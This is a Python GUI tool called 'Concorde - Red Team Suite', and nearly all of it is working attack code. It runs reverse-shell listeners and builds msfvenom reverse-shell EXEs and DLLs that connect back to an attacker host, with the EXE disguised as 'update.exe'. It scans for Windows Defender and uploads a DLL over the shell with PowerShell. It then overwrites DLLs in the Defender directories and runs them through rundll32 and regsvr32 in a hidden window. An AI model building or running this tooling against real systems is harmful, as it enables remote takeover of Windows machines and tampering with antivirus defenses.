#!/usr/bin/env python3
"""
Concorde - Red Team Suite
"""

import sys
import os
import subprocess
import base64
import socket
import time
import shutil
import re
import threading
from datetime import datetime

try:
    from PyQt5.QtWidgets import *
    from PyQt5.QtCore import *
    from PyQt5.QtGui import *
except ImportError:
    print("[!] PyQt5 not found! Please install: pip install PyQt5")
    sys.exit(1)


class ShellListener(QThread):
    """Reverse Shell Listener - Direct cmd shell"""
    connected = pyqtSignal(str, str, str)
    data_received = pyqtSignal(str, str)
    disconnected = pyqtSignal(str)
    shell_ready = pyqtSignal(str, object)
    
    def __init__(self, port, stage="stage1"):
        super().__init__()
        self.port = port
        self.stage = stage
        self.running = False
        self.socket = None
        self.client = None
        self.client_addr = None
        self.lock = threading.Lock()
        
    def run(self):
        self.running = True
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.settimeout(1)
            self.socket.bind(("0.0.0.0", self.port))
            self.socket.listen(5)
            self.connected.emit(self.stage, "0.0.0.0", str(self.port))
            
            while self.running:
                try:
                    self.client, addr = self.socket.accept()
                    self.client.settimeout(0.1)
                    self.client_addr = addr
                    self.connected.emit(self.stage, addr[0], str(addr[1]))
                    self.shell_ready.emit(self.stage, self)
                    self.handle_client()
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        time.sleep(0.1)
        except Exception as e:
            print(f"Listener error: {e}")
        finally:
            self.disconnected.emit(self.stage)
    
    def handle_client(self):
        """Handle client connection"""
        # Send initial command to get prompt
        self.send_command("whoami")
        time.sleep(1)
        
        while self.running and self.client:
            try:
                data = self.client.recv(4096)
                if data:
                    decoded = data.decode('utf-8', errors='ignore')
                    self.data_received.emit(self.stage, decoded)
                else:
                    break
            except socket.timeout:
                continue
            except:
                break
        
        if self.client:
            try:
                self.client.close()
            except:
                pass
            self.client = None
        self.disconnected.emit(self.stage)
    
    def send_command(self, command):
        """Send command to shell"""
        with self.lock:
            if self.client:
                try:
                    if not command.endswith('\n'):
                        command += '\n'
                    self.client.send(command.encode())
                    return True
                except:
                    return False
        return False
    
    def is_connected(self):
        return self.client is not None
    
    def stop(self):
        self.running = False
        if self.client:
            try:
                self.client.close()
            except:
                pass
        if self.socket:
            try:
                self.socket.close()
            except:
                pass


class ShellSessionWidget(QWidget):
    """Shell Session Widget - Direct command execution"""
    def __init__(self, stage, listener, session_id, parent=None):
        super().__init__(parent)
        self.stage = stage
        self.listener = listener
        self.session_id = session_id
        self.command_history = []
        self.init_ui()
        
        # Connect data signal
        self.listener.data_received.connect(self.on_data_received)
        
    def init_ui(self):
        layout = QVBoxLayout()
        layout.setSpacing(5)
        
        # Header
        header = QHBoxLayout()
        self.status_label = QLabel(f"● {self.stage.upper()} | Session: {self.session_id}")
        self.status_label.setStyleSheet("color: #00ff00; font-weight: bold; font-size: 14px;")
        header.addWidget(self.status_label)
        
        self.conn_status = QLabel("● CONNECTED")
        self.conn_status.setStyleSheet("color: #00ff00; font-weight: bold;")
        header.addWidget(self.conn_status)
        header.addStretch()
        layout.addLayout(header)
        
        # Output area - terminal style
        self.output = QTextEdit()
        self.output.setFont(QFont("Courier New", 10))
        self.output.setStyleSheet("""
            QTextEdit {
                background-color: #000000;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 3px;
                font-family: 'Courier New';
            }
        """)
        self.output.setReadOnly(True)
        layout.addWidget(self.output)
        
        # Command input - terminal style
        input_layout = QHBoxLayout()
        
        # Prompt label
        self.prompt_label = QLabel("C:\\>")
        self.prompt_label.setStyleSheet("color: #00ff00; font-weight: bold; font-size: 12px;")
        input_layout.addWidget(self.prompt_label)
        
        self.input = QLineEdit()
        self.input.setPlaceholderText("Type Windows command here...")
        self.input.returnPressed.connect(self.send_command)
        self.input.setStyleSheet("""
            QLineEdit {
                background-color: #000000;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 3px;
                padding: 8px;
                font-size: 12px;
            }
        """)
        input_layout.addWidget(self.input)
        
        self.send_btn = QPushButton("Execute")
        self.send_btn.clicked.connect(self.send_command)
        self.send_btn.setStyleSheet("""
            QPushButton {
                background-color: #003300;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 3px;
                padding: 8px 15px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #005500; }
        """)
        input_layout.addWidget(self.send_btn)
        
        layout.addLayout(input_layout)
        
        # Quick commands
        quick_layout = QHBoxLayout()
        quick_label = QLabel("Quick:")
        quick_label.setStyleSheet("color: #00ff00;")
        quick_layout.addWidget(quick_label)
        
        quick_commands = [
            "whoami", "hostname", "ipconfig /all", "net user", 
            "dir C:\\", "tasklist", "systeminfo", "netstat -an"
        ]
        
        for cmd in quick_commands:
            btn = QPushButton(cmd)
            btn.setMaximumWidth(100)
            btn.clicked.connect(lambda checked, c=cmd: self.quick_command(c))
            btn.setStyleSheet("""
                QPushButton {
                    background-color: #1a1a1a;
                    color: #00ff00;
                    border: 1px solid #00ff00;
                    border-radius: 3px;
                    padding: 3px;
                    font-size: 10px;
                }
                QPushButton:hover { background-color: #003300; }
            """)
            quick_layout.addWidget(btn)
        
        quick_layout.addStretch()
        layout.addLayout(quick_layout)
        
        self.setLayout(layout)
    
    def send_command(self):
        """Send command to shell"""
        cmd = self.input.text().strip()
        
        if cmd and self.listener:
            if self.listener.is_connected():
                # Show command
                self.output.append(f"\n{self.prompt_label.text()} {cmd}")
                
                # Send command
                if self.listener.send_command(cmd):
                    self.command_history.append(cmd)
                    self.input.clear()
                else:
                    self.output.append("[!] Failed to send command")
            else:
                self.output.append("[!] Shell disconnected")
    
    def quick_command(self, cmd):
        """Execute quick command"""
        self.input.setText(cmd)
        self.send_command()
    
    def on_data_received(self, stage, data):
        """Handle incoming data"""
        if stage == self.stage:
            # Clean and append data
            self.output.append(data.rstrip())
            scrollbar = self.output.verticalScrollBar()
            scrollbar.setValue(scrollbar.maximum())
    
    def append_output(self, data):
        self.output.append(data.rstrip())
        scrollbar = self.output.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
    
    def get_output_text(self):
        return self.output.toPlainText()


class EXEGenerationWorker(QThread):
    """EXE Generation Worker - Creates cmd reverse shell"""
    progress = pyqtSignal(int)
    status = pyqtSignal(str)
    finished = pyqtSignal(dict)
    error = pyqtSignal(str)
    
    def __init__(self, lhost, lport, exe_name, script_dir):
        super().__init__()
        self.lhost = lhost
        self.lport = lport
        self.exe_name = exe_name
        self.script_dir = script_dir
        
    def run(self):
        try:
            exe_path = os.path.join(self.script_dir, self.exe_name)
            
            self.status.emit(f"[*] Creating EXE: {self.exe_name}")
            self.progress.emit(10)
            
            # Use cmd reverse shell (not meterpreter for easier command execution)
            cmd = [
                "msfvenom",
                "-p", "windows/x64/shell_reverse_tcp",
                f"LHOST={self.lhost}",
                f"LPORT={str(self.lport)}",
                "-f", "exe",
                "-o", exe_path
            ]
            
            self.status.emit("[*] Running msfvenom...")
            self.progress.emit(30)
            
            try:
                subprocess.run(cmd, capture_output=True, check=True, timeout=30)
                self.progress.emit(80)
                
                if os.path.exists(exe_path) and os.path.getsize(exe_path) > 0:
                    file_size = os.path.getsize(exe_path)
                    self.status.emit(f"[+] EXE created: {self.exe_name} ({file_size} bytes)")
                    self.progress.emit(100)
                    
                    self.finished.emit({
                        'success': True,
                        'exe_name': self.exe_name,
                        'exe_path': exe_path,
                        'size': file_size,
                        'lhost': self.lhost,
                        'lport': self.lport
                    })
                else:
                    raise Exception("EXE file not created")
                    
            except subprocess.TimeoutExpired:
                self.alternative_generation(exe_path)
            except subprocess.CalledProcessError:
                self.alternative_generation(exe_path)
                
        except Exception as e:
            self.error.emit(f"EXE generation failed: {str(e)}")
    
    def alternative_generation(self, exe_path):
        self.status.emit("[*] Trying alternative payload...")
        
        cmd = [
            "msfvenom",
            "-p", "windows/shell_reverse_tcp",
            f"LHOST={self.lhost}",
            f"LPORT={str(self.lport)}",
            "-f", "exe",
            "-o", exe_path
        ]
        
        try:
            subprocess.run(cmd, capture_output=True, check=True, timeout=20)
            
            if os.path.exists(exe_path) and os.path.getsize(exe_path) > 0:
                file_size = os.path.getsize(exe_path)
                self.status.emit(f"[+] EXE created (alt): {self.exe_name} ({file_size} bytes)")
                self.progress.emit(100)
                
                self.finished.emit({
                    'success': True,
                    'exe_name': self.exe_name,
                    'exe_path': exe_path,
                    'size': file_size,
                    'lhost': self.lhost,
                    'lport': self.lport,
                    'method': 'alternative'
                })
            else:
                raise Exception("Empty file")
                
        except Exception as e:
            self.error.emit(f"Failed: {str(e)}")


class AVScanWorker(QThread):
    """AV Scanner"""
    progress = pyqtSignal(int)
    status = pyqtSignal(str)
    dll_found = pyqtSignal(str, str)
    av_found = pyqtSignal(str, str)
    scan_complete = pyqtSignal()
    error = pyqtSignal(str)
    
    def __init__(self, shell_session):
        super().__init__()
        self.shell = shell_session
        
    def run(self):
        try:
            self.scan_av_products()
        except Exception as e:
            self.error.emit(str(e))
    
    def scan_av_products(self):
        self.status.emit("[*] Starting AV/EDR scan...")
        self.progress.emit(10)
        
        # Default DLLs
        default_dlls = [
            "version.dll", "mpr.dll", "srvcli.dll", "mpclient.dll",
            "wldp.dll", "cryptnet.dll", "nci.dll", "profapi.dll",
            "winmm.dll", "msimg32.dll"
        ]
        
        for dll in default_dlls:
            self.dll_found.emit(dll, f"C:\\Program Files\\Windows Defender\\{dll}")
            time.sleep(0.1)
        
        # AV products
        self.av_found.emit("Windows Defender", "Active AV detected")
        
        # Send scan commands
        commands = [
            'dir "C:\\Program Files\\Windows Defender\\*.dll" /b',
            'sc query WinDefend',
            'tasklist | findstr /i "MsMpEng MpCmdRun"'
        ]
        
        for i, cmd in enumerate(commands):
            if not self.isRunning():
                return
            
            self.status.emit(f"[*] Sending command {i+1}/{len(commands)}...")
            self.progress.emit(30 + (i * 20))
            
            if self.shell.send_command(cmd):
                time.sleep(2)
            
        self.progress.emit(100)
        self.status.emit("[+] Scan complete!")
        self.scan_complete.emit()


class DLLInjectionWorker(QThread):
    """DLL Injection Worker - Creates cmd reverse shell DLL"""
    progress = pyqtSignal(int)
    status = pyqtSignal(str)
    finished = pyqtSignal(dict)
    error = pyqtSignal(str)
    
    def __init__(self, shell_session, dll_name, lhost, lport):
        super().__init__()
        self.shell = shell_session
        self.dll_name = dll_name
        self.lhost = lhost
        self.lport = lport
        self.results = {}
        
    def run(self):
        try:
            self.inject_dll()
            self.finished.emit(self.results)
        except Exception as e:
            self.error.emit(str(e))
    
    def inject_dll(self):
        self.status.emit("[*] Starting DLL injection...")
        self.progress.emit(10)
        
        self.status.emit(f"[*] Creating DLL: {self.dll_name}")
        self.progress.emit(30)
        
        script_dir = os.path.dirname(os.path.abspath(__file__))
        dll_path = os.path.join(script_dir, self.dll_name)
        
        # Use cmd reverse shell (not meterpreter)
        cmd = [
            "msfvenom",
            "-p", "windows/x64/shell_reverse_tcp",
            f"LHOST={self.lhost}",
            f"LPORT={str(self.lport)}",
            "-f", "dll",
            "-o", dll_path
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if os.path.exists(dll_path) and os.path.getsize(dll_path) > 0:
                file_size = os.path.getsize(dll_path)
                self.status.emit(f"[+] DLL created: {self.dll_name} ({file_size} bytes)")
                self.progress.emit(50)
                
                # Upload DLL
                self.status.emit("[*] Uploading DLL to target...")
                self.upload_dll(dll_path)
                self.progress.emit(70)
                
                # Replace system DLL
                self.status.emit("[*] Replacing system DLL...")
                self.replace_dll()
                self.progress.emit(80)
                
                # Trigger execution
                self.status.emit("[*] Triggering DLL execution...")
                self.trigger_execution()
                self.progress.emit(90)
                
                # Wait for new shell
                self.status.emit("[*] Waiting 10 seconds for new shell...")
                time.sleep(10)
                
                self.progress.emit(100)
                
                self.results = {
                    'success': True,
                    'dll_name': self.dll_name,
                    'dll_path': dll_path,
                    'size': file_size,
                    'lport': self.lport
                }
                
                self.status.emit("[+] DLL injection completed!")
            else:
                raise Exception(f"DLL creation failed")
                
        except Exception as e:
            raise Exception(f"DLL injection failed: {str(e)}")
    
    def upload_dll(self, dll_path):
        """Upload DLL using PowerShell"""
        try:
            with open(dll_path, 'rb') as f:
                dll_data = base64.b64encode(f.read()).decode()
            
            # Upload using PowerShell
            ps_cmd = f'powershell -c "[System.IO.File]::WriteAllBytes(\'C:\\Users\\Public\\{self.dll_name}\', [System.Convert]::FromBase64String(\'{dll_data}\'))"'
            
            if self.shell.send_command(ps_cmd):
                time.sleep(5)
                self.status.emit(f"[+] DLL uploaded to C:\\Users\\Public\\{self.dll_name}")
            else:
                self.status.emit("[!] Upload failed")
                
        except Exception as e:
            self.status.emit(f"[!] Upload error: {str(e)}")
    
    def replace_dll(self):
        """Replace system DLL"""
        targets = [
            f"C:\\Program Files\\Windows Defender\\{self.dll_name}",
            f"C:\\ProgramData\\Microsoft\\Windows Defender\\{self.dll_name}"
        ]
        
        for target in targets:
            self.shell.send_command(f'copy "{target}" "{target}.bak" 2>nul')
            time.sleep(1)
            self.shell.send_command(f'copy /Y "C:\\Users\\Public\\{self.dll_name}" "{target}" 2>nul')
            time.sleep(1)
        
        self.status.emit("[+] DLL replacement completed")
    
    def trigger_execution(self):
        """Trigger DLL execution"""
        commands = [
            f'rundll32.exe "C:\\Users\\Public\\{self.dll_name}",Main',
            f'regsvr32.exe /s "C:\\Users\\Public\\{self.dll_name}"',
            f'powershell -c "Start-Process rundll32.exe -ArgumentList \'C:\\Users\\Public\\{self.dll_name},Main\' -WindowStyle Hidden"'
        ]
        
        for cmd in commands:
            self.shell.send_command(cmd)
            time.sleep(3)
        
        self.status.emit("[+] Execution triggered")


class RedTeamGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.listeners = {}
        self.session_widgets = {}
        self.payload_paths = {}
        self.session_counter = 0
        self.found_avs = []
        self.found_dlls = []
        self.selected_dll = None
        
        self.init_ui()
        self.start_listener(4444, "stage1")
        
    def init_ui(self):
        self.setWindowTitle("Red Team Suite - CMD Shell Manager v7.0")
        self.setGeometry(50, 50, 1500, 900)
        
        self.setStyleSheet("""
            QMainWindow { background-color: #0a0a0a; }
            QGroupBox {
                color: #00ff00;
                border: 2px solid #00ff00;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 10px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #00ff00;
            }
            QLabel { color: #00ff00; }
            QLineEdit, QTextEdit, QListWidget {
                background-color: #1a1a1a;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 3px;
                padding: 5px;
            }
            QPushButton {
                background-color: #003300;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 3px;
                padding: 8px 15px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #005500; }
            QPushButton:disabled { 
                background-color: #1a1a1a;
                color: #006600;
                border-color: #006600;
            }
            QTabWidget::pane {
                background-color: #0a0a0a;
                border: 1px solid #00ff00;
            }
            QTabBar::tab {
                background-color: #1a1a1a;
                color: #00ff00;
                padding: 8px 15px;
                margin-right: 2px;
            }
            QTabBar::tab:selected { background-color: #003300; }
            QProgressBar {
                border: 1px solid #00ff00;
                border-radius: 3px;
                text-align: center;
                color: #00ff00;
            }
            QProgressBar::chunk {
                background-color: #00ff00;
                border-radius: 3px;
            }
            QStatusBar { background-color: #0a0a0a; color: #00ff00; }
        """)
        
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        
        # Main splitter
        splitter = QSplitter(Qt.Horizontal)
        
        # Left panel
        left_widget = QWidget()
        left_layout = QVBoxLayout(left_widget)
        
        # Configuration
        config_group = QGroupBox("⚙ Configuration")
        config_layout = QVBoxLayout()
        
        config_layout.addWidget(QLabel("LHOST:"))
        self.lhost_input = QLineEdit("10.10.10.107")
        config_layout.addWidget(self.lhost_input)
        
        config_layout.addWidget(QLabel("LPORT (EXE):"))
        self.lport_input = QLineEdit("4444")
        config_layout.addWidget(self.lport_input)
        
        config_layout.addWidget(QLabel("EXE Name:"))
        self.exe_name_input = QLineEdit("update.exe")
        config_layout.addWidget(self.exe_name_input)
        
        config_layout.addWidget(QLabel("DLL Port:"))
        self.dll_port_input = QLineEdit("5555")
        config_layout.addWidget(self.dll_port_input)
        
        self.btn_stage1 = QPushButton("🎯 Stage 1: Generate EXE")
        self.btn_stage1.clicked.connect(self.stage1_generate)
        self.btn_stage1.setMinimumHeight(35)
        config_layout.addWidget(self.btn_stage1)
        
        self.btn_scan = QPushButton("🔍 Stage 2: Scan AV/EDR")
        self.btn_scan.clicked.connect(self.scan_av_products)
        self.btn_scan.setEnabled(False)
        self.btn_scan.setMinimumHeight(35)
        config_layout.addWidget(self.btn_scan)
        
        self.btn_inject = QPushButton("💉 Stage 3: Inject DLL")
        self.btn_inject.clicked.connect(self.inject_dll)
        self.btn_inject.setEnabled(False)
        self.btn_inject.setMinimumHeight(35)
        self.btn_inject.setStyleSheet("""
            QPushButton {
                background-color: #660000;
                color: #ff0000;
                border: 2px solid #ff0000;
            }
            QPushButton:hover { background-color: #880000; }
        """)
        config_layout.addWidget(self.btn_inject)
        
        config_layout.addStretch()
        config_group.setLayout(config_layout)
        left_layout.addWidget(config_group)
        
        # DLL List
        dll_group = QGroupBox("💉 Injectable DLLs")
        dll_layout = QVBoxLayout()
        self.dll_list = QListWidget()
        self.dll_list.itemClicked.connect(self.on_dll_selected)
        dll_layout.addWidget(self.dll_list)
        dll_group.setLayout(dll_layout)
        left_layout.addWidget(dll_group)
        
        splitter.addWidget(left_widget)
        
        # Right panel
        right_widget = QWidget()
        right_layout = QVBoxLayout(right_widget)
        
        self.tab_widget = QTabWidget()
        
        # Log tab
        self.log_text = QTextEdit()
        self.log_text.setFont(QFont("Courier New", 10))
        self.log_text.setReadOnly(True)
        self.tab_widget.addTab(self.log_text, "📋 Log")
        
        # Shell Sessions tab
        self.shell_tab = QWidget()
        shell_layout = QVBoxLayout(self.shell_tab)
        
        self.no_sessions_label = QLabel("No active shell sessions...\nWaiting for connection...")
        self.no_sessions_label.setAlignment(Qt.AlignCenter)
        self.no_sessions_label.setStyleSheet("color: #666666; font-size: 16px;")
        shell_layout.addWidget(self.no_sessions_label)
        
        self.session_tabs = QTabWidget()
        self.session_tabs.setTabsClosable(True)
        self.session_tabs.tabCloseRequested.connect(self.close_session_tab)
        self.session_tabs.hide()
        shell_layout.addWidget(self.session_tabs)
        
        self.tab_widget.addTab(self.shell_tab, "💀 Shell Sessions")
        
        right_layout.addWidget(self.tab_widget)
        splitter.addWidget(right_widget)
        splitter.setSizes([450, 1050])
        main_layout.addWidget(splitter)
        
        # Status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready v7.0 - Direct CMD Shell")
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setMaximumWidth(200)
        self.status_bar.addPermanentWidget(self.progress_bar)
        
        self.status_label = QLabel("⚪ Waiting...")
        self.status_bar.addPermanentWidget(self.status_label)
    
    def log_message(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": "#00ff00", "WARN": "#ffff00", "ERROR": "#ff0000",
            "SUCCESS": "#00ffaa", "STAGE1": "#00aaff", "SCAN": "#ffaa00",
            "DLL": "#ff6600", "SHELL": "#00ffff"
        }
        color = colors.get(level, "#00ff00")
        self.log_text.append(f'<span style="color: {color};">[{timestamp}] [{level}] {msg}</span>')
        self.status_bar.showMessage(msg, 3000)
    
    def update_progress(self, value):
        self.progress_bar.setValue(value)
    
    def update_status(self, text):
        self.status_label.setText(text)
    
    def stage1_generate(self):
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip()
        exe_name = self.exe_name_input.text().strip()
        
        if not lhost or not lport:
            self.log_message("Enter LHOST and LPORT!", "ERROR")
            return
        
        if not exe_name:
            exe_name = "payload.exe"
        
        self.log_message("=" * 50, "STAGE1")
        self.log_message("Stage 1: Generating CMD Reverse Shell EXE", "STAGE1")
        self.update_status("⚪ Generating...")
        self.progress_bar.setValue(0)
        
        self.btn_stage1.setEnabled(False)
        
        script_dir = os.path.dirname(os.path.abspath(__file__))
        
        self.exe_worker = EXEGenerationWorker(lhost, lport, exe_name, script_dir)
        self.exe_worker.progress.connect(self.update_progress)
        self.exe_worker.status.connect(lambda x: self.log_message(x, "STAGE1"))
        self.exe_worker.finished.connect(self.exe_done)
        self.exe_worker.error.connect(self.exe_error)
        self.exe_worker.start()
    
    def exe_done(self, results):
        self.progress_bar.setValue(100)
        self.btn_stage1.setEnabled(True)
        
        if results.get('exe_path'):
            self.payload_paths['exe'] = results['exe_path']
        
        self.log_message(f"[+] EXE created: {results['exe_name']} ({results['size']} bytes)", "SUCCESS")
        self.log_message(f"[*] Path: {results['exe_path']}", "INFO")
        self.log_message("[*] Upload and execute on target, then wait for shell...", "INFO")
        self.update_status("🟢 Waiting for shell")
        self.start_listener(int(results['lport']), "stage1")
    
    def exe_error(self, msg):
        self.progress_bar.setValue(0)
        self.btn_stage1.setEnabled(True)
        self.log_message(f"[!] {msg}", "ERROR")
        self.update_status("🔴 Failed")
    
    def scan_av_products(self):
        session = self.get_active_session()
        if not session:
            self.log_message("[!] No shell session! Execute EXE on target first.", "ERROR")
            return
        
        self.log_message("=" * 50, "SCAN")
        self.log_message("Stage 2: Scanning for AV/EDR Products", "SCAN")
        self.update_status("🟡 Scanning...")
        self.progress_bar.setValue(0)
        
        self.btn_scan.setEnabled(False)
        self.dll_list.clear()
        self.found_dlls = []
        
        self.scan_worker = AVScanWorker(session)
        self.scan_worker.progress.connect(self.update_progress)
        self.scan_worker.status.connect(lambda x: self.log_message(x, "SCAN"))
        self.scan_worker.dll_found.connect(self.on_dll_found)
        self.scan_worker.scan_complete.connect(self.scan_done)
        self.scan_worker.error.connect(self.scan_error)
        self.scan_worker.start()
    
    def on_dll_found(self, dll_name, full_path):
        if dll_name not in self.found_dlls:
            self.found_dlls.append(dll_name)
            self.dll_list.addItem(f"💉 {dll_name}")
            self.log_message(f"[+] Found DLL: {dll_name}", "DLL")
    
    def scan_done(self):
        self.progress_bar.setValue(100)
        self.btn_scan.setEnabled(True)
        self.btn_inject.setEnabled(True)
        
        self.log_message(f"[+] Scan complete! Found {len(self.found_dlls)} DLLs", "SUCCESS")
        self.update_status("🟢 Scan complete")
    
    def scan_error(self, msg):
        self.log_message(f"[!] Scan error: {msg}", "ERROR")
        self.btn_scan.setEnabled(True)
        self.progress_bar.setValue(0)
    
    def on_dll_selected(self, item):
        dll_name = item.text().replace("💉 ", "").strip()
        if dll_name.endswith('.dll'):
            self.selected_dll = dll_name
            self.log_message(f"[*] Selected DLL: {dll_name}", "DLL")
    
    def inject_dll(self):
        session = self.get_active_session()
        if not session:
            self.log_message("[!] No shell session!", "ERROR")
            return
        
        if hasattr(self, 'selected_dll') and self.selected_dll:
            dll_name = self.selected_dll
        else:
            current_item = self.dll_list.currentItem()
            if current_item:
                dll_name = current_item.text().replace("💉 ", "").strip()
            else:
                dll_name = "version.dll"
        
        lhost = self.lhost_input.text().strip()
        dll_port = self.dll_port_input.text().strip()
        
        if not lhost or not dll_port:
            self.log_message("[!] Enter LHOST and DLL Port!", "ERROR")
            return
        
        self.log_message("=" * 50, "DLL")
        self.log_message(f"Stage 3: Injecting {dll_name}", "DLL")
        self.update_status("🟣 Injecting...")
        self.progress_bar.setValue(0)
        
        # Start listener for stage3
        self.start_listener(int(dll_port), "stage3")
        self.btn_inject.setEnabled(False)
        
        self.worker = DLLInjectionWorker(session, dll_name, lhost, int(dll_port))
        self.worker.progress.connect(self.update_progress)
        self.worker.status.connect(lambda x: self.log_message(x, "DLL"))
        self.worker.finished.connect(self.injection_done)
        self.worker.error.connect(lambda x: self.log_message(f"[!] {x}", "ERROR"))
        self.worker.start()
    
    def injection_done(self, results):
        self.log_message("[+] DLL injection completed!", "SUCCESS")
        self.progress_bar.setValue(100)
        self.update_status("🟣 DLL injected")
        
        self.btn_inject.setEnabled(True)
        self.log_message("[*] New shell will appear in Shell Sessions tab if connected", "INFO")
    
    def start_listener(self, port, stage):
        if stage in self.listeners:
            self.listeners[stage].stop()
            self.listeners[stage].wait(1000)
        
        listener = ShellListener(port, stage)
        listener.connected.connect(self.on_connected)
        listener.data_received.connect(self.on_data)
        listener.disconnected.connect(self.on_disconnected)
        listener.shell_ready.connect(self.on_shell_ready)
        listener.start()
        
        self.listeners[stage] = listener
        self.log_message(f"[*] Listener: {stage} on port {port}", "INFO")
    
    def on_connected(self, stage, ip, port):
        self.log_message(f"[+] {stage} connected: {ip}:{port}", "SUCCESS")
        self.update_status(f"🟢 {stage}: Connected")
        
        if stage == "stage1":
            self.btn_scan.setEnabled(True)
    
    def on_data(self, stage, data):
        for widget in self.session_widgets.values():
            if widget.stage == stage:
                widget.append_output(data)
                break
    
    def on_disconnected(self, stage):
        self.log_message(f"[!] {stage} disconnected", "WARN")
        
        if stage == "stage1":
            self.btn_scan.setEnabled(False)
            self.btn_inject.setEnabled(False)
    
    def on_shell_ready(self, stage, listener):
        """Called when new shell connects"""
        self.session_counter += 1
        session_id = f"{stage}_{self.session_counter}"
        
        # Create shell widget
        widget = ShellSessionWidget(stage, listener, session_id, self)
        self.session_widgets[session_id] = widget
        
        # Add to session tabs
        tab_index = self.session_tabs.addTab(widget, f"{stage.upper()} #{self.session_counter}")
        self.session_tabs.setCurrentIndex(tab_index)
        
        # Show session tabs
        self.session_tabs.show()
        self.no_sessions_label.hide()
        
        # Switch to Shell Sessions tab
        self.tab_widget.setCurrentIndex(1)
        
        self.log_message(f"[+] New CMD shell session: {session_id}", "SHELL")
        self.log_message(f"[+] Type Windows commands directly in the shell", "SHELL")
        self.update_status(f"🟢 Shell {session_id} ready")
    
    def close_session_tab(self, index):
        widget = self.session_tabs.widget(index)
        if widget:
            for sid, w in list(self.session_widgets.items()):
                if w == widget:
                    if w.listener:
                        w.listener.stop()
                    del self.session_widgets[sid]
                    break
            self.session_tabs.removeTab(index)
            
            if self.session_tabs.count() == 0:
                self.session_tabs.hide()
                self.no_sessions_label.show()
    
    def get_active_session(self):
        if self.session_tabs.count() > 0:
            widget = self.session_tabs.currentWidget()
            if widget and hasattr(widget, 'listener') and widget.listener.is_connected():
                return widget.listener
        return None
    
    def closeEvent(self, event):
        for stage in list(self.listeners.keys()):
            self.listeners[stage].stop()
        event.accept()


def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    window = RedTeamGUI()
    window.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
